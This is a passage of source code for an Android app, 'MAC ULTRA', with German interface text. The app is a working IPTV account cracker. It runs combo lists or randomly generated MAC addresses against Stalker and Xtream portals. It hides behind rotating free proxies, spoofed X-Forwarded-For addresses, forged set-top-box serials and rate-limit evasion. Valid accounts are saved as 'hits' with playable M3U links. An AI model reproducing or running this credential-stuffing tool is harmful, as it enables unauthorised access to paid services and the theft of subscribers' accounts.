        if not HAS_JNIUS: return
        try:
            if mPlayer.isPlaying(): mPlayer.stop()
        except: pass

    def create_stat_box(self, p, t, v, c):
        box = StyledCard(orientation="vertical", padding=8); box.add_widget(Label(text=t, font_size="11sp", color=(0.7,0.7,0.7,1))); lbl = Label(text=v, font_size="24sp", bold=True, color=c)
        box.add_widget(lbl); p.add_widget(box); return lbl

    def update_slider_label(self, i, v): self.detail_status.text, self.detail_status.color = ("ALLES SPEICHERN", GREEN) if v == 1 else ("NUR MAC/URL", RED)
    def load_combos(self):
        files = []
        for folder in get_data_dirs("Combo"):
            if not os.path.exists(folder):
                continue
            try:
                files.extend([f for f in os.listdir(folder) if f.lower().endswith(".txt")])
            except Exception:
                pass
        files = sorted(set(files))
        return files if files else ["NO COMBOS FOUND"]

    def refresh_file_lists(self, *a):
        combos = self.load_combos()
        self.file_spinner.values = combos
        self.file_spinner.text = combos[0] if combos and combos[0] != "NO COMBOS FOUND" else "NO COMBOS FOUND"
        if combos and combos[0] != "NO COMBOS FOUND":
            self.update_log_safe(f"[color=00FF00][OK][/color] {len(combos)} Combo-Datei(en) gefunden.")
        else:
            dirs = "\n".join(get_data_dirs("Combo")[:4])
            self.update_log_safe("[color=FF0000][INFO][/color] Keine Combos gefunden. Prüfe /storage/emulated/0/Combo und erlaube Alle-Dateien-Zugriff.")
            self.update_log_safe(f"[color=FFFF00][ORDNER][/color]\n{dirs}")

    def refresh_portal_lists(self, *a):
        vals = self.load_portal_lists()
        self.portal_file_spinner.values = vals
        if self.portal_file_spinner.text not in vals:
            self.portal_file_spinner.text = "SELECT PORTAL LIST"

    def load_proxies(self):
        files = []
        for folder in get_data_dirs("proxies"):
            if not os.path.exists(folder):
                continue
            try:
                files.extend([f for f in os.listdir(folder) if f.lower().endswith(".txt")])
            except Exception:
                pass
        files = sorted(set(files))
        return files if files else ["NO PROXIES FOUND"]

    def load_portal_lists(self):
        files = []
        for folder in get_data_dirs("Portals"):
            if not os.path.exists(folder):
                continue
            try:
                files.extend([f for f in os.listdir(folder) if f.lower().endswith(".txt")])
            except Exception:
                pass

        files = sorted(set(files))
        return files + ["USE SINGLE"] if files else ["NO PORTAL LISTS FOUND", "USE SINGLE"]

    def paste_clip(self, *a): self.portal_input.text = Clipboard.paste().strip()
    def go_to_manager(self, *a): self.manager.get_screen('portals').load_favs(); self.manager.current = 'portals'
    def toggle_proxy(self, btn):
        self.use_proxies = not self.use_proxies
        if self.use_proxies: btn.text, btn.color, btn.bg_color_inst.rgba = "PROXY: ON", GREEN, (0.05, 0.15, 0.1, 1)
        else: btn.text, btn.color, btn.bg_color_inst.rgba = "PROXY: OFF", RED, (0.15, 0.05, 0.05, 1)

    def open_storage_settings(self, *a):
        if platform == "android":
            request_manage_all_files_access()
            self.update_log_safe("[color=FFFF00][SPEICHER][/color] Bitte 'Alle Dateien Zugriff' für MAC ULTRA erlauben und zurück zur App gehen.")
        else:
            self.update_log_safe("[color=FFFF00][SPEICHER][/color] Nicht-Android Umgebung.")

    def check_storage_status(self, *a):
        if has_manage_all_files_access():
            self.update_log_safe("[color=00FF00][SPEICHER][/color] Alle-Dateien-Zugriff ist aktiv.")
            self.update_log_safe(f"[color=FFFF00][FAVORIT][/color] Pfad: {get_fav_file_candidates()[0]}")
            self.update_log_safe(f"[color=FFFF00][PORTALS][/color] Ordner: {get_data_dirs('Portals')[0]}")
        else:
            self.update_log_safe("[color=FF0000][SPEICHER][/color] Alle-Dateien-Zugriff fehlt. Button SPEICHER drücken.")
            self.update_log_safe(f"[color=FFFF00][FAVORIT][/color] Fallback wird genutzt, falls Hauptspeicher nicht erlaubt ist.")

    def get_random_ip(self, geo):
        info = GEO_DATA.get(geo, GEO_DATA['DE']); return f"{random.choice(info['ip'])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"

    def detect_portal_geo(self, url):
        u = url.lower()
        if ".it" in u: return 'IT'
        elif ".es" in u: return 'ES'
        elif ".fr" in u: return 'FR'
        return 'DE'

    async def get_portal_isp_info(self, url):
        try:
            domain = url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
            async with httpx.AsyncClient(timeout=5) as client:
                r = await client.get(f"http://ip-api.com/json/{domain}")
                data = r.json()
                if data.get('status') == 'success':
                    cc = data.get('countryCode', '??')
                    return f"[{cc}] {data.get('country')} | {data.get('isp', 'Unknown ISP')}"
        except: pass
        return "[??] Unknown ISP"

    async def smart_sleep(self, status):
        self.request_count += 1
        mode = self.delay_mode_spinner.text
        if "1-3s" in mode: d_min, d_max = 1, 3
        elif "2-4s" in mode: d_min, d_max = 2, 4
        elif "3-6s" in mode: d_min, d_max = 3, 6
        else: d_min = d_max = self.delay_slider.value
        delay = random.uniform(d_min, d_max)
        if status == 429:
            self.error_streak += 1; cooldown = min(15 + self.error_streak * 5, 90)
            self.update_log_safe(f"[color=FF0000][LIMIT][/color] 429 -> {cooldown}s Cooldown"); await asyncio.sleep(cooldown); return
        elif status in [403, 503]: self.error_streak += 1; delay += min(self.error_streak * 1.5, 8)
        else: self.error_streak = 0
        if self.request_count % 50 == 0: await asyncio.sleep(random.uniform(5, 12))
        await asyncio.sleep(delay + random.uniform(0, 0.2))

    def update_log_safe(self, t):
        Clock.schedule_once(lambda dt: self._do_log(t), 0)

    def _do_log(self, t):
        self.hit_list.append(t)

        if len(self.hit_list) > 25:
            self.hit_list.pop(0)

        self.log_display.text = "\n".join(self.hit_list)
        self.log_display.texture_update()
        self.log_display.height = self.log_display.texture_size[1] + 20

        try:
            self.scroll.scroll_y = 1
        except Exception:
            pass

        try:
            self.log_display.canvas.ask_update()
            self.scroll.canvas.ask_update()
        except Exception:
            pass

    async def check_proxies_stable(self, ctx):
        total = len(self.proxy_list)
        if total == 0: return False
        self.update_log_safe(f"[color=00FFFF][PROXY][/color] Checking {total} Proxies..."); valid, checked_count, sem = [], 0, asyncio.Semaphore(50)
        async def check_one(p):
            nonlocal checked_count
            try:
                async with sem:
                    async with httpx.AsyncClient(proxy=f"http://{p}", verify=ctx, timeout=4.0) as client:
                        r = await client.get("http://www.google.com")
                        if r.status_code == 200: valid.append(p)
            except: pass
            checked_count += 1
            if checked_count % 20 == 0 or checked_count == total: Clock.schedule_once(lambda dt: setattr(self.progress_label, 'text', f"PROXY: {len(valid)} UP / {checked_count} CHECKED"))
        await asyncio.gather(*[check_one(p) for p in self.proxy_list])
        self.working_proxies = valid; self.update_log_safe(f"[color=00FF00][PROXY][/color] {len(valid)} Proxies are READY!"); return len(valid) > 0

    def toggle(self, *_):
        if not self.running:
            self.running = True; self.play_native_audio()
            self.start_btn.text, self.start_btn.color = "STOP MAC ULTRA", RED
            self.start_btn.bg_color_inst.rgba = (0.15, 0.05, 0.05, 1)
            Thread(target=lambda: asyncio.run(self.engine()), daemon=True).start()
        else: 
            self.running = False; self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN
            self.start_btn.bg_color_inst.rgba = (0.05, 0.15, 0.1, 1)
            self.status_code_label.text = "STOPPED"; self.update_log_safe("[color=FF0000]!!! MAC ULTRA STOPPED !!![/color]")

    async def engine(self):
        portals = []
        if self.portal_file_spinner.text not in ["SELECT PORTAL LIST", "USE SINGLE", "NO PORTAL LISTS FOUND"]:
            selected_portal_list = os.path.basename(self.portal_file_spinner.text)
            p_path = first_existing_file(selected_portal_list, get_data_dirs("Portals"))

            if p_path and os.path.exists(p_path):
                with open(p_path, 'r', errors='ignore') as f:
                    portals = [l.strip().split('/c')[0].rstrip('/') for l in f if l.strip().startswith("http")]
            else:
                self.update_log_safe("[color=FF0000][PORTAL][/color] Portal-Liste nicht gefunden. Prüfe /storage/emulated/0/Portals.")
        if not portals:
            single = self.portal_input.text.strip().split('/c')[0].rstrip('/')
            if single.startswith("http"): portals = [single]
        if not portals: self.update_log_safe("[color=FF0000][ERROR][/color] No Portals found!"); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return
        
        if len(portals) == 1 and ":" not in portals[0].replace("http://", "").replace("https://", ""):
            found_p = await self.find_working_port(portals[0])
            if found_p: portals = [found_p]
            else:
                self.update_log_safe("[color=FF0000][ERROR][/color] No Port found! Stopped."); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return

        ctx = ssl.create_default_context(); ctx.set_ciphers(DEFAULT_CIPHERS); ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE

        self.current_api_path, self.current_api_method = await self.discover_best_api(portals[0], ctx)

        self.portal_isp = await self.get_portal_isp_info(portals[0])
        self.update_log_safe(f"[color=FFFF00][INFO][/color] Server: {self.portal_isp}")

        if self.use_proxies:
            if self.proxy_source.text == "FREE (ProxyScrape)":
                try: 
                    async with httpx.AsyncClient() as c:
                        r = await c.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http")
                        self.proxy_list = [p.strip() for p in r.text.split('\n') if p.strip()]
                except: pass
            else:
                f_p = first_existing_file(self.proxy_spinner.text, get_data_dirs("proxies"))
                if os.path.exists(f_p):
                    with open(f_p, 'r') as f: self.proxy_list = [l.strip() for l in f if l.strip()]
            if not await self.check_proxies_stable(ctx): self.update_log_safe("[color=FF0000][ERROR][/color] No Working Proxies!"); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return
        
        if self.scan_mode.text == "COMBO FILE":
            path = first_existing_file(self.file_spinner.text, get_data_dirs("Combo"))
            if not path:
                self.update_log_safe("[color=FF0000][ERROR][/color] Combo-Datei nicht gefunden. Drücke REFRESH. App-Ordner steht im Log.")
                self.running = False
                Clock.schedule_once(lambda dt: self.reset_start_btn())
                return
            with open(path, 'r', errors='ignore') as f:
                self.combo_data = [l.strip() for l in f if l.strip()]
            self.update_log_safe(f"[color=00FF00][OK][/color] Combo geladen: {len(self.combo_data)} Zeilen")
        else:
            prefix = self.prefix_spinner.text if self.prefix_spinner.text != "MAC's" else "00:1A:79:"
            self.combo_data = [f"{prefix}{':'.join([f'{random.randint(0,255):02X}' for _ in range(3)])}" for _ in range(int(self.random_count.text or 1000))]
            self.update_log_safe(f"[color=00FF00][OK][/color] Random MACs erstellt: {len(self.combo_data)}")
        
        self.total_lines, self.checked, self.hits, self.start_time, self.request_count = len(self.combo_data), 0, 0, time.time(), 0
        Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
        queue = asyncio.Queue()
        for l in self.combo_data: queue.put_nowait(l)
        
        num_bots = int(self.bot_slider.value)
        await asyncio.gather(*[self.worker(queue, ctx, portals) for _ in range(num_bots)])
        
        self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn())

    def reset_start_btn(self, *a):
        self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN
        self.start_btn.bg_color_inst.rgba = (0.05, 0.15, 0.1, 1)

    async def worker(self, queue, ctx, portals):
        while self.running and not queue.empty():
            line = await queue.get()
            tasks = [self.process_check(line, p, ctx) for p in portals]
            await asyncio.gather(*tasks)
            await self.smart_sleep(int(self.last_status) if self.last_status.isdigit() else 200)
            self.checked += 1; Clock.schedule_once(lambda dt: self.refresh_ui())
            queue.task_done()

    async def process_check(self, line, portal, ctx):
        if not self.running: return
        det_geo = self.detect_portal_geo(portal); geo_i = GEO_DATA.get(det_geo, GEO_DATA['DE'])
        px_url = f"http://{random.choice(self.working_proxies)}" if self.use_proxies and self.working_proxies else None
        
        p_name = portal.replace("http://", "").replace("https://", "").split(":")[0]
        ua_headers = random.choice(ATTACK_PROFILES)
        
        async with httpx.AsyncClient(verify=ctx, timeout=12, proxy=px_url, follow_redirects=True) as client:
            try:
                portal_ip = socket.gethostbyname(portal.split("//")[-1].split(":")[0])
                
                clean_mac = line.split(':')[0:6]
                mac_str = ":".join(clean_mac).upper()
                sn_full = hashlib.md5(mac_str.encode()).hexdigest().upper()
                sn_cut = sn_full[:13]
                dev_id = hashlib.sha256(mac_str.encode()).hexdigest().lower()
                fake_ip = self.get_random_ip(det_geo)
                
                if self.engine_mode.text == "M3U SCAN":
                    if ':' in line:
                        u, p = line.split(':')[:2]
                        if self.current_api_method == "GET":
                            r = await client.get(f"{portal}{self.current_api_path}?username={u}&password={p}", headers=ua_headers)
                        else:
                            r = await client.post(f"{portal}{self.current_api_path}", data={"username": u, "password": p}, headers=ua_headers)
                        
                        self.last_status = str(r.status_code)
                        
                        if self.check_vpn_restriction(r.text):
                            self.update_log_safe(f"[color=808080][{p_name}][/color] [color=FFFF00][VPN-LOCK][/color] {u}")
                            return

                        if r.status_code == 200 and 'user_info' in r.text:
                            js_all = r.json(); js = js_all.get('user_info', {})
                            if js.get('auth') == 1:
                                filter_val = self.country_filter.text.upper(); has_country = True
                                if filter_val:
                                    cat_r = await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_live_categories", headers=ua_headers)
                                    cat_txt = cat_r.text.upper()
                                    has_country = any(c.strip() in cat_txt for c in filter_val.split(','))
                                
                                if has_country:
                                    exp, days = self.get_clean_time(js.get('exp_date')); cre_date, _ = self.get_clean_time(js.get('created_at'))
                                    act_c, max_c = str(js.get('active_cons','0')), str(js.get('max_connections','1'))
                                    l_c, m_c, s_c, l_l, m_l, s_l = 0, 0, 0, "", "", ""
                                    if self.detail_slider.value == 1:
                                        try:
                                            r_lc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_live_categories", headers=ua_headers)).json()
                                            l_c, l_l = len(r_lc), " «💢» ".join([c.get('category_name') for c in r_lc[:10]])
                                            r_mc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_vod_categories", headers=ua_headers)).json()
                                            m_c, m_l = len(r_mc), " «💢» ".join([c.get('category_name') for c in r_mc[:10]])
                                            r_sc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_series_categories", headers=ua_headers)).json()
                                            s_c, s_l = len(r_sc), " «💢» ".join([c.get('category_name') for c in r_sc[:10]])
                                        except: pass
                                    
                                    star = "*" if int(max_c) > 1 else ""
                                    self.hits += 1
                                    vpn_stat = await self.get_vpn_info_api(portal_ip)
                                    self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT {star}][/color] {u} | [color=00FFFF]{days}[/color]")
                                    self.save_hit(portal, portal_ip, ua_headers.get('User-Agent'), u, exp, days, p, l_c, m_c, s_c, sn_cut, dev_id, l_l, m_l, s_l, geo_i['tz'], act_c, max_c, True, cre_date, vpn_stat)
                
                else:
                    mac = mac_str
                    stb_h = {**ua_headers, "X-STB-SN": sn_cut, "X-STB-Device-ID": dev_id, "X-Forwarded-For": fake_ip, "Cookie": f"mac={urllib.parse.quote(mac)}; stb_lang=en; timezone={urllib.parse.quote(geo_i['tz'])};"}
                    r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml", headers=stb_h)
                    self.last_status = str(r.status_code)
                    
                    if r.status_code == 200 and 'token' in r.text:
                        tk = r.json().get('js', {}).get('token'); stb_h["Authorization"] = f"Bearer {tk}"
                        ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=stb_h)
                        js = ri.json().get('js', {}); exp_raw = js.get('end_date') or js.get('phone') or "Unlimited"
                        exp, days = self.get_clean_time(exp_raw); cre_date, _ = self.get_clean_time(js.get('reg_date'))
                        pw, act_c, max_c = str(js.get('parent_password') or "0000"), str(js.get('active_cons') or "0"), str(js.get('max_connections') or "1")
                        
                        l_c, m_c, s_c, l_l, m_l, s_l = 0, 0, 0, "", "", ""
                        if self.detail_slider.value == 1:
                            try:
                                r_l = (await client.get(f"{portal}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml", headers=stb_h)).json()
                                l_c = len(r_l.get('js', {}).get('data', []))
                                cat_l = (await client.get(f"{portal}/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml", headers=stb_h)).json()
                                l_l = " «💢» ".join([c.get('title') for c in cat_l.get('js', [])[:10]])
                                r_v = (await client.get(f"{portal}/portal.php?type=vod&action=get_ordered_list&JsHttpRequest=1-xml", headers=stb_h)).json()
                                m_c = r_v.get('js', {}).get('total_items', "0")
                                cat_m = (await client.get(f"{portal}/portal.php?type=vod&action=get_categories&JsHttpRequest=1-xml", headers=stb_h)).json()
                                m_l = " «💢» ".join([c.get('title') for c in cat_m.get('js', [])[:10]])
                                r_s = (await client.get(f"{portal}/portal.php?type=series&action=get_ordered_list&JsHttpRequest=1-xml", headers=stb_h)).json()
                                s_c = r_s.get('js', {}).get('total_items', "0")
                                cat_s = (await client.get(f"{portal}/portal.php?type=series&action=get_categories&JsHttpRequest=1-xml", headers=stb_h)).json()
                                s_l = " «💢» ".join([c.get('title') for c in cat_s.get('js', [])[:10]])
                            except: pass
                        
                        star = "*" if int(max_c) > 1 else ""
                        self.hits += 1
                        vpn_stat = await self.get_vpn_info_api(portal_ip)
                        # Syntax-Fehler behoben (self. update_log_safe)
                        self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT {star}][/color] {mac} | [color=00FFFF]{days}[/color]")
                        self.save_hit(portal, portal_ip, ua_headers.get('User-Agent'), mac, exp, days, pw, l_c, m_c, s_c, sn_cut, dev_id, l_l, m_l, s_l, geo_i['tz'], act_c, max_c, False, cre_date, vpn_stat)
            except:
                self.last_status = "ERR"

    def get_clean_time(self, raw):
        raw_str = str(raw).strip()
        if raw_str.isdigit() and len(raw_str) >= 9:
            try:
                dt = datetime.fromtimestamp(int(raw_str))
                days_diff = (dt - datetime.now()).days
                return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
            except:
                pass
        if not raw_str or raw_str.lower() in ["unlimited", "none", "0", "false"]:
            return "Unlimited", "Unlimited"
        try:
            parts = raw_str.split(',')
            clean_date = f"{parts[0].strip()}, {parts[1].strip()}" if len(parts) >= 2 else raw_str.strip()
            for fmt in ("%B %d, %Y", "%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y"):
                try:
                    dt = datetime.strptime(clean_date, fmt)
                    days_diff = (dt - datetime.now()).days
                    return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
                except:
                    continue
        except:
            pass
        return raw_str, "Unlimited"

    def save_hit(self, portal, portal_ip, server_h, id_val, exp, days, pw, live, movies, series, sn, dev_id, l_list, m_list, s_list, tz_val, active_conn, max_conn, is_m3u=False, cre_date="N/A", vpn_info="N/A"):
        sub_folder = "M3U_Hits" if is_m3u else "MAC_Hits"
        final_dir = os.path.join(first_writable_dir("Hits"), "MAC-ULTRA-Hits", sub_folder)
        os.makedirs(final_dir, exist_ok=True)

        domain = portal.replace("http://", "").replace("https://", "").split(":")[0].replace("/", "_")
        m3u = f"{portal}/get.php?mac={id_val}&type=m3u_plus&output=ts" if not is_m3u else f"{portal}/get.php?username={id_val}&password={pw}&output=ts"

        id_label = "MAC" if not is_m3u else "USER"

        try:
            p_parts = self.portal_isp.split('|')
            nation_part = p_parts[0].strip() if len(p_parts) > 0 else "Unknown"
            provider_part = p_parts[1].strip() if len(p_parts) > 1 else "Unknown"
        except Exception:
            nation_part, provider_part = "Unknown", "Unknown"

        box = f"""
██████████████████████████████████
█
█   ⚡  𝗠𝗔𝗖 𝗨𝗟𝗧𝗥𝗔 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗩1  ⚡
█   👤  ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴍᴏʀᴘʜᴇᴜs
█
██████████████████████████████████

DATEN 📂 ACCOUNT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ Portal      : {portal}/c/
▶ {id_label.ljust(11)} : {id_val} 🏁
▶ Pass/Pin    : {pw}
▶ Created     : {cre_date}
▶ Expiry      : {exp} (⌛ {days})
▶ SN          : {sn}
▶ Dev ID      : {dev_id}
▶ Os          : ⍟ Android ⍟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STATUS 🗿 CHECK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ VPN         : {vpn_info}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STATISTIK 📊 DATEN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ Live Tv     : {live}
▶ Filme       : {movies}
▶ Serien      : {series}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CONNECTION 🛸 INFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ Active      : {active_conn}
▶ Max Conn.   : {max_conn}
▶ Zone        : {tz_val}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SERVER 🌐 INFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ Server      : 🚦 {portal_ip}
▶ Provider    : {provider_part}
▶ Nation      : {nation_part}
▶ Status      : ᴘʀɪᴠᴀᴛᴍᴏᴅᴇ 🏴‍☠️
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔗 M3U LINK:
{m3u}
"""

        if l_list:
            box += f"\n📂 LIVE LIST\n╚┈❲ {l_list} ❳"
        if m_list:
            box += f"\n🎬 MOVIE LIST\n╚┈❲ {m_list} ❳"
        if s_list:
            box += f"\n🎞️ SERIES LIST\n╚┈❲ {s_list} ❳"

        box += f"\n\n🛰️ SCANNED: {time.strftime('%H:%M')} | {time.strftime('%d.%m.%Y')}\n██████████████████████████████████████████\n\n"

        hit_file = os.path.join(final_dir, f"{domain}.txt")

        try:
            with open(hit_file, "a", encoding="utf-8") as f:
                f.write(box)
        except Exception as e:
            self.update_log_safe(f"[color=FF0000][SAVE ERROR][/color] {e}")

    def refresh_ui(self, *a):
        self.pbar.value = self.checked
        self.hit_count_label.text = str(self.hits)
        self.progress_label.text = f"PROGRESS: {self.checked} / {self.total_lines}"
        self.status_code_label.text = self.last_status
        el = time.time() - self.start_time
        if el > 0:
            self.cpm_label.text = str(int((self.checked / el) * 60))

class MagApp(App):

    def build(self):

        self.title = "MAC ULTRA"

        # =========================
        # DEVICE CHECK
        # =========================

        try:
            allowed, msg = asyncio.run(
                github_device_allowed()
            )

        except Exception as e:

            allowed = False
            msg = str(e)

        if not allowed:

            android_id = get_android_id() or "Keine Android-ID gefunden"

            root = FloatLayout()

            with root.canvas.before:
                Color(0.01, 0.02, 0.04, 1)
                root_bg = RoundedRectangle(
                    pos=root.pos,
                    size=root.size,
                    radius=[0]
                )

            def update_root_bg(instance, value):
                root_bg.pos = root.pos
                root_bg.size = root.size

            root.bind(pos=update_root_bg, size=update_root_bg)

            card = StyledCard(
                orientation="vertical",
                padding=[24, 26, 24, 22],
                spacing=14,
                bg_color=(0.04, 0.06, 0.10, 1),
                size_hint=(0.92, None),
                height=520,
                pos_hint={"center_x": 0.5, "center_y": 0.5}
            )

            logo = Label(
                text="[color=00E6FF][b]MAC ULTRA[/b][/color]",
                markup=True,
                font_size="30sp",
                size_hint_y=None,
                height=48,
                halign="center",
                valign="middle"
            )

            status = Label(
                text="[color=FF4444][b]GERÄT NICHT FREIGESCHALTET[/b][/color]",
                markup=True,
                font_size="18sp",
                size_hint_y=None,
                height=42,
                halign="center",
                valign="middle"
            )

            message = Label(
                text=(
                    "[color=FFFFFF]"
                    "Dieses Gerät besitzt aktuell keine aktive Freischaltung.\n\n"
                    "Bitte sende deine Android-ID an den Administrator, "
                    "damit dein Zugang aktiviert werden kann."
                    "[/color]"
                ),
                markup=True,
                font_size="15sp",
                size_hint_y=None,
                height=120,
                halign="center",
                valign="middle"
            )

            message.bind(
                width=lambda instance, value: setattr(
                    instance,
                    "text_size",
                    (max(value - 20, 100), None)
                )
            )

            id_label = Label(
                text="[color=00E6FF][b]DEINE ANDROID-ID[/b][/color]",
                markup=True,
                font_size="14sp",
                size_hint_y=None,
                height=28,
                halign="center",
                valign="middle"
            )

            id_box = TextInput(
                text=str(android_id),
                readonly=True,
                multiline=False,
                font_size="20sp",
                size_hint_y=None,
                height=62,
                background_color=(0.08, 0.10, 0.14, 1),
                foreground_color=(0, 0.95, 1, 1),
                cursor_color=(0, 0.95, 1, 1),
                halign="center",
                padding=[10, 16]
            )

            copy_btn = StyledButton(
                text="ANDROID-ID KOPIEREN",
                size_hint_y=None,
                height=66,
                bg_color=(0.02, 0.22, 0.13, 1),
                color=GREEN,
                bold=True,
                font_size="16sp"
            )

            def copy_android_id(instance):
                Clipboard.copy(str(android_id))
                copy_btn.text = "ID KOPIERT ✓"

            copy_btn.bind(on_press=copy_android_id)

            hint = Label(
                text="[color=AAAAAA]Nach der Freischaltung die App bitte neu starten.[/color]",
                markup=True,
                font_size="12sp",
                size_hint_y=None,
                height=36,
                halign="center",
                valign="middle"
            )

            footer = Label(
                text="[color=666666]Created by Morpheus[/color]",
                markup=True,
                font_size="13sp",
                size_hint_y=None,
                height=30,
                halign="center",
                valign="middle"
            )

            card.add_widget(logo)
            card.add_widget(status)
            card.add_widget(message)
            card.add_widget(id_label)
            card.add_widget(id_box)
            card.add_widget(copy_btn)
            card.add_widget(hint)
            card.add_widget(footer)

            root.add_widget(card)

            return root

        sm = ScreenManager()

        sm.add_widget(
            IntroScreen(name="intro")
        )

        sm.add_widget(
            MagUltraScreen(name="main")
        )

        sm.add_widget(
            PortalManagerScreen(name="portals")
        )

        sm.current = "intro"

        return sm

if __name__ == "__main__":
    MagApp().run()
